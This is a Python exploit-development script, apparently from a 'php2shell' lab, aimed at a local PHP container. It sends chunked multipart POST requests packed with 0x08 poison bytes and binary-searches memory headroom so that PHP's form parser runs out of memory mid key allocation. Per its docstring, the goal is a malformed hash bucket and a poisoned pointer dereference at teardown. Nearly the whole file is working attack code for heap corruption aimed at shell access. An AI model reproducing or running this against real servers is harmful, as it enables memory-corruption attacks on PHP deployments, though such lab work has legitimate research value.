#!/usr/bin/env python3
"""php2shell lab, oom9: value-carrying keys + fine G sweep -> key-alloc crossing.

Per key part, allocation order: value emalloc (528B, retained), param emalloc
(~1016B, freed at part end), key zend_string_init (~328B, post-commit!),
bucket (~36B). Net retained per iteration ~576B -> 521 iters = 300KB, far
above the ~135KB failure window: crossing MUST land mid-run. Which alloc
class fails is set by the exact headroom G -> sweep G in 256B steps across
the window; any strike with fatal alloc ~328 (the key string) = malformed
bucket with poison bytes -> teardown deref 0x0808080808080808.
"""

import re
import socket
import subprocess
import sys
import time

HOST = "127.0.0.1"
BOUNDARY = "b" + "X" * 20
POISON = b"\x08"
UNIT = 128 * 1024
KEYNAME = 300
KEYVAL = 512
KEYRUN = 3000
BIGFREE = 256 * 1024


def part(name: str, value: bytes) -> bytes:
    head = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
    ).encode()
    return head + value + b"\r\n"


def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True, timeout=60)
    time.sleep(1.5)


def send(port: int, parts: list[bytes], path: str = "index.php") -> tuple[bool, str]:
    body = b"".join(parts) + b"--" + BOUNDARY.encode() + b"--\r\n"
    s = socket.create_connection((HOST, port), timeout=300)
    s.sendall(
        (
            f"POST /{path} HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
        ).encode()
    )
    for i in range(0, len(body), 65536):
        c = body[i:i + 65536]
        s.sendall(f"{len(c):x}\r\n".encode() + c + b"\r\n")
    s.sendall(b"0\r\n\r\n")
    resp = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        resp += d
    s.close()
    t = resp.decode("utf-8", "replace")
    return ("Fatal error" in t), t


def fatal_n(text: str):
    m = re.search(r"tried to allocate (\d+) bytes", text)
    return int(m.group(1)) if m else None


def build(fill_units: int, rem: int, keyrun: int = 0) -> list[bytes]:
    big = POISON * BIGFREE
    ps = [part("b0", big), part("b0", big)]              # poison block + free
    fill = POISON * UNIT
    for i in range(fill_units):
        ps.append(part(f"u{i}", fill))
    if rem > 0:
        ps.append(part("r", POISON * rem))
    keyname = (POISON * KEYNAME).decode("latin1")
    kv = POISON * KEYVAL
    for k in range(keyrun):
        ps.append(part(keyname + str(k), kv))
    return ps


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    log = lambda *a: print(*a, flush=True)

    # calibration (shape: churn + units + rem, no keys)
    a, b = 300, 520
    u_ok = None
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, build(mid, 0))
        log(f"cal units={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            u_ok = mid
            a = mid + 1
    a, b = 0, UNIT
    r_ok = 0
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, build(u_ok, mid))
        log(f"cal rem={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            r_ok = mid
            a = mid + 1
    log(f"edge: {u_ok} units + rem {r_ok}")

    # coarse: drop fill in UNIT steps until the key run goes fatal
    g = 0
    hit = None
    while g <= 3 * UNIT:
        restart()
        units = u_ok - (1 if g >= UNIT else 0)
        rem = r_ok - (g % UNIT if g >= UNIT else g)
        if rem < 0:
            rem = 0
        fatal, text = send(port, build(units, rem, keyrun=KEYRUN))
        n = fatal_n(text) if fatal else None
        log(f"sweep G={g}: fatal={fatal} alloc={n}")
        if fatal:
            hit = (units, rem, n, text)
            break
        g += UNIT // 2
    if not hit:
        log("key run never crossed — increase KEYVAL or KEYRUN")
        return
    units, rem, n, text = hit
    if n is not None and n < KEYNAME + 128:
        log(f"*** KEY CROSSING AT G={g} (alloc={n}) ***")
    # fine: 256B steps around the transition, hunting the key-alloc strike
    base_rem = rem
    for d in range(0, 4097, 256):
        r = base_rem - d
        if r < 0:
            break
        restart()
        fatal, text = send(port, build(units, r, keyrun=KEYRUN))
        n = fatal_n(text) if fatal else None
        tag = "  *** KEY/HASH CROSSING ***" if (fatal and n and n < KEYNAME + 128) else ""
        log(f"fine G+{d}: fatal={fatal} alloc={n}{tag}")
        if tag:
            log(text[:300])
            break
    log("done — check error.log for 'exit signal Segmentation'")


if __name__ == "__main__":
    main()
